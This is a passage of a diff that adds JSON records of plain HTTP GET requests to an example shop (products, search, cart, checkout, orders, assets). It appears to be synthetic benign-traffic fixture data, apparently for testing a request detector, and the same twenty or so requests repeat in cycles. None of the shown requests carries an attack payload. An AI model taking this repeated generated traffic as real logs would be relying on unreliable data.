+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml",
+        "Accept-Language": "en-GB,en;q=0.9",
+        "Referer": "https://shop.example.com/"
+      },
+      "note": ""
+    },
+    {
+      "id": "n123",
+      "method": "GET",
+      "path": "/orders/1042",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+        "Accept": "application/json",
+        "Referer": "https://shop.example.com/products"
+      },
+      "note": ""
+    },
+    {
+      "id": "n124",
+      "method": "GET",
+      "path": "/orders/987654",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n125",
+      "method": "GET",
+      "path": "/account/profile",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "curl/8.5.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n126",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=apple+juice",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Go-http-client/2.0",
+        "Accept": "application/json"
+      },
+      "note": ""
+    },
+    {
+      "id": "n127",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=orange",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml",
+        "Accept-Language": "en-GB,en;q=0.9",
+        "Referer": "https://shop.example.com/"
+      },
+      "note": ""
+    },
+    {
+      "id": "n128",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%E8%8B%B9%E6%9E%9C",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+        "Accept": "application/json",
+        "Referer": "https://shop.example.com/products"
+      },
+      "note": ""
+    },
+    {
+      "id": "n129",
+      "method": "GET",
+      "path": "/category/beverages",
+      "query": "min_price=1&max_price=50",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n130",
+      "method": "GET",
+      "path": "/category/snacks",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "curl/8.5.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n131",
+      "method": "GET",
+      "path": "/api/products",
+      "query": "limit=20&offset=40",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Go-http-client/2.0",
+        "Accept": "application/json"
+      },
+      "note": ""
+    },
+    {
+      "id": "n132",
+      "method": "GET",
+      "path": "/api/products/550e8400-e29b-41d4-a716-446655440000",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml",
+        "Accept-Language": "en-GB,en;q=0.9",
+        "Referer": "https://shop.example.com/"
+      },
+      "note": ""
+    },
+    {
+      "id": "n133",
+      "method": "GET",
+      "path": "/assets/app.4f3c9a1b2c3d4e5f.js",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+        "Accept": "application/json",
+        "Referer": "https://shop.example.com/products"
+      },
+      "note": ""
+    },
+    {
+      "id": "n134",
+      "method": "GET",
+      "path": "/assets/vendor.deadbeefdeadbeef.css",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n135",
+      "method": "GET",
+      "path": "/assets/img/product-1024.jpg",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "curl/8.5.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n136",
+      "method": "GET",
+      "path": "/reviews/1042",
+      "query": "page=1",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Go-http-client/2.0",
+        "Accept": "application/json"
+      },
+      "note": ""
+    },
+    {
+      "id": "n137",
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml",
+        "Accept-Language": "en-GB,en;q=0.9",
+        "Referer": "https://shop.example.com/"
+      },
+      "note": ""
+    },
+    {
+      "id": "n138",
+      "method": "GET",
+      "path": "/products",
+      "query": "page=2&sort=price_asc",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+        "Accept": "application/json",
+        "Referer": "https://shop.example.com/products"
+      },
+      "note": ""
+    },
+    {
+      "id": "n139",
+      "method": "GET",
+      "path": "/products/apple-juice",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n140",
+      "method": "GET",
+      "path": "/products/orange-juice-1l",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "curl/8.5.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n141",
+      "method": "GET",
+      "path": "/cart",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Go-http-client/2.0",
+        "Accept": "application/json"
+      },
+      "note": ""
+    },
+    {
+      "id": "n142",
+      "method": "GET",
+      "path": "/checkout",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml",
+        "Accept-Language": "en-GB,en;q=0.9",
+        "Referer": "https://shop.example.com/"
+      },
+      "note": ""
+    },
+    {
+      "id": "n143",
+      "method": "GET",
+      "path": "/orders/1042",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+        "Accept": "application/json",
+        "Referer": "https://shop.example.com/products"
+      },
+      "note": ""
+    },
+    {
+      "id": "n144",
+      "method": "GET",
+      "path": "/orders/987654",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n145",
+      "method": "GET",
+      "path": "/account/profile",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "curl/8.5.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n146",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=apple+juice",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Go-http-client/2.0",
+        "Accept": "application/json"
+      },
+      "note": ""
+    },
+    {
+      "id": "n147",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=orange",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml",
+        "Accept-Language": "en-GB,en;q=0.9",
+        "Referer": "https://shop.example.com/"
+      },
+      "note": ""
+    },
+    {
+      "id": "n148",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%E8%8B%B9%E6%9E%9C",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+        "Accept": "application/json",
+        "Referer": "https://shop.example.com/products"
+      },
+      "note": ""
+    },
+    {
+      "id": "n149",
+      "method": "GET",
+      "path": "/category/beverages",
+      "query": "min_price=1&max_price=50",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n150",
+      "method": "GET",
+      "path": "/category/snacks",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "curl/8.5.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n151",
+      "method": "GET",
+      "path": "/api/products",
+      "query": "limit=20&offset=40",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Go-http-client/2.0",
+        "Accept": "application/json"
+      },
+      "note": ""
+    },
+    {
+      "id": "n152",
+      "method": "GET",
+      "path": "/api/products/550e8400-e29b-41d4-a716-446655440000",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml",
+        "Accept-Language": "en-GB,en;q=0.9",
+        "Referer": "https://shop.example.com/"
+      },
+      "note": ""
+    },
+    {
+      "id": "n153",
+      "method": "GET",
+      "path": "/assets/app.4f3c9a1b2c3d4e5f.js",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+        "Accept": "application/json",
+        "Referer": "https://shop.example.com/products"
+      },
+      "note": ""
+    },
+    {
+      "id": "n154",
+      "method": "GET",
+      "path": "/assets/vendor.deadbeefdeadbeef.css",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n155",
+      "method": "GET",
+      "path": "/assets/img/product-1024.jpg",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "curl/8.5.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n156",
+      "method": "GET",
+      "path": "/reviews/1042",
+      "query": "page=1",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Go-http-client/2.0",
+        "Accept": "application/json"
+      },
+      "note": ""
+    },
+    {
+      "id": "n157",
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml",
+        "Accept-Language": "en-GB,en;q=0.9",
+        "Referer": "https://shop.example.com/"
+      },
+      "note": ""
+    },
+    {
+      "id": "n158",
+      "method": "GET",
+      "path": "/products",
+      "query": "page=2&sort=price_asc",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+        "Accept": "application/json",
+        "Referer": "https://shop.example.com/products"
+      },
+      "note": ""
+    },
+    {
+      "id": "n159",
+      "method": "GET",
+      "path": "/products/apple-juice",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n160",
+      "method": "GET",
+      "path": "/products/orange-juice-1l",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "curl/8.5.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n161",
+      "method": "GET",
+      "path": "/cart",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Go-http-client/2.0",
+        "Accept": "application/json"
+      },
+      "note": ""
+    },
+    {
+      "id": "n162",
+      "method": "GET",
+      "path": "/checkout",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml",
+        "Accept-Language": "en-GB,en;q=0.9",
+        "Referer": "https://shop.example.com/"
+      },
+      "note": ""
+    },
+    {
+      "id": "n163",
+      "method": "GET",
+      "path": "/orders/1042",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+        "Accept": "application/json",
+        "Referer": "https://shop.example.com/products"
+      },
+      "note": ""
+    },
+    {
+      "id": "n164",
+      "method": "GET",
+      "path": "/orders/987654",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n165",
+      "method": "GET",
+      "path": "/account/profile",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "curl/8.5.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n166",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=apple+juice",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Go-http-client/2.0",
+        "Accept": "application/json"
+      },
+      "note": ""
+    },
+    {
+      "id": "n167",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=orange",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml",
+        "Accept-Language": "en-GB,en;q=0.9",
+        "Referer": "https://shop.example.com/"
+      },
+      "note": ""
+    },
+    {
+      "id": "n168",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%E8%8B%B9%E6%9E%9C",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+        "Accept": "application/json",
+        "Referer": "https://shop.example.com/products"
+      },
+      "note": ""
+    },
+    {
+      "id": "n169",
+      "method": "GET",
+      "path": "/category/beverages",
+      "query": "min_price=1&max_price=50",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n170",
+      "method": "GET",
+      "path": "/category/snacks",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "curl/8.5.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n171",
+      "method": "GET",
+      "path": "/api/products",
+      "query": "limit=20&offset=40",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Go-http-client/2.0",
+        "Accept": "application/json"
+      },
+      "note": ""
+    },
+    {
+      "id": "n172",
+      "method": "GET",
+      "path": "/api/products/550e8400-e29b-41d4-a716-446655440000",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml",
+        "Accept-Language": "en-GB,en;q=0.9",
+        "Referer": "https://shop.example.com/"
+      },
+      "note": ""
+    },
+    {
+      "id": "n173",
+      "method": "GET",
+      "path": "/assets/app.4f3c9a1b2c3d4e5f.js",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+        "Accept": "application/json",
+        "Referer": "https://shop.example.com/products"
+      },
+      "note": ""
+    },
+    {
+      "id": "n174",
+      "method": "GET",
+      "path": "/assets/vendor.deadbeefdeadbeef.css",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n175",
+      "method": "GET",
+      "path": "/assets/img/product-1024.jpg",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "curl/8.5.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n176",
+      "method": "GET",
+      "path": "/reviews/1042",
+      "query": "page=1",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Go-http-client/2.0",
+        "Accept": "application/json"
+      },
+      "note": ""
+    },
+    {
+      "id": "n177",
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml",
+        "Accept-Language": "en-GB,en;q=0.9",
+        "Referer": "https://shop.example.com/"
+      },
+      "note": ""
+    },
+    {
+      "id": "n178",
+      "method": "GET",
+      "path": "/products",
+      "query": "page=2&sort=price_asc",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+        "Accept": "application/json",
+        "Referer": "https://shop.example.com/products"
+      },
+      "note": ""
+    },
+    {
+      "id": "n179",
+      "method": "GET",
+      "path": "/products/apple-juice",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n180",
+      "method": "GET",
+      "path": "/products/orange-juice-1l",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "curl/8.5.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n181",
+      "method": "GET",
+      "path": "/cart",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Go-http-client/2.0",
+        "Accept": "application/json"
+      },
+      "note": ""
+    },
+    {
+      "id": "n182",
+      "method": "GET",
+      "path": "/checkout",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml",
+        "Accept-Language": "en-GB,en;q=0.9",
+        "Referer": "https://shop.example.com/"
+      },
+      "note": ""
+    },
+    {
+      "id": "n183",
+      "method": "GET",
+      "path": "/orders/1042",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+        "Accept": "application/json",
+        "Referer": "https://shop.example.com/products"
+      },
+      "note": ""
+    },
+    {
+      "id": "n184",
+      "method": "GET",
+      "path": "/orders/987654",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n185",
+      "method": "GET",
+      "path": "/account/profile",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "curl/8.5.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n186",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=apple+juice",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Go-http-client/2.0",
+        "Accept": "application/json"
+      },
+      "note": ""
+    },
+    {
+      "id": "n187",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=orange",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml",
+        "Accept-Language": "en-GB,en;q=0.9",
+        "Referer": "https://shop.example.com/"
+      },
+      "note": ""
+    },
+    {
+      "id": "n188",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%E8%8B%B9%E6%9E%9C",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+        "Accept": "application/json",
+        "Referer": "https://shop.example.com/products"
+      },
+      "note": ""
+    },
+    {
+      "id": "n189",
+      "method": "GET",
+      "path": "/category/beverages",
+      "query": "min_price=1&max_price=50",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n190",
+      "method": "GET",
+      "path": "/category/snacks",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "curl/8.5.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n191",
+      "method": "GET",
+      "path": "/api/products",
+      "query": "limit=20&offset=40",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Go-http-client/2.0",
+        "Accept": "application/json"
+      },
+      "note": ""
+    },
+    {
+      "id": "n192",
+      "method": "GET",
+      "path": "/api/products/550e8400-e29b-41d4-a716-446655440000",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml",
+        "Accept-Language": "en-GB,en;q=0.9",
+        "Referer": "https://shop.example.com/"
+      },
+      "note": ""
+    },
+    {
+      "id": "n193",
+      "method": "GET",
+      "path": "/assets/app.4f3c9a1b2c3d4e5f.js",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+        "Accept": "application/json",
+        "Referer": "https://shop.example.com/products"
+      },
+      "note": ""
+    },
+    {
+      "id": "n194",
+      "method": "GET",
+      "path": "/assets/vendor.deadbeefdeadbeef.css",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n195",
+      "method": "GET",
+      "path": "/assets/img/product-1024.jpg",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "curl/8.5.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n196",
+      "method": "GET",
+      "path": "/reviews/1042",
+      "query": "page=1",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Go-http-client/2.0",
+        "Accept": "application/json"
+      },
+      "note": ""
+    },
+    {
+      "id": "n197",
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml",
+        "Accept-Language": "en-GB,en;q=0.9",
+        "Referer": "https://shop.example.com/"
+      },
+      "note": ""
+    },
+    {
+      "id": "n198",
+      "method": "GET",
+      "path": "/products",
+      "query": "page=2&sort=price_asc",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+        "Accept": "application/json",
+        "Referer": "https://shop.example.com/products"
+      },
+      "note": ""
+    },
+    {
+      "id": "n199",
+      "method": "GET",
+      "path": "/products/apple-juice",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n200",
+      "method": "GET",
+      "path": "/products/orange-juice-1l",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "curl/8.5.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n201",
+      "method": "GET",
+      "path": "/cart",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Go-http-client/2.0",
+        "Accept": "application/json"
+      },
+      "note": ""
+    },
+    {
+      "id": "n202",
+      "method": "GET",
+      "path": "/checkout",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml",
+        "Accept-Language": "en-GB,en;q=0.9",
+        "Referer": "https://shop.example.com/"
+      },
+      "note": ""
+    },
+    {
+      "id": "n203",
+      "method": "GET",
+      "path": "/orders/1042",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+        "Accept": "application/json",
+        "Referer": "https://shop.example.com/products"
+      },
+      "note": ""
+    },
+    {
+      "id": "n204",
+      "method": "GET",
+      "path": "/orders/987654",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n205",
+      "method": "GET",
+      "path": "/account/profile",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "curl/8.5.0",
+        "Accept": "*/*"
+      },
+      "note": ""
+    },
+    {
+      "id": "n206",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=apple+juice",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Go-http-client/2.0",
+        "Accept": "application/json"
+      },
+      "note": ""
+    },
+    {
+      "id": "n207",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=orange",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml",
+        "Accept-Language": "en-GB,en;q=0.9",
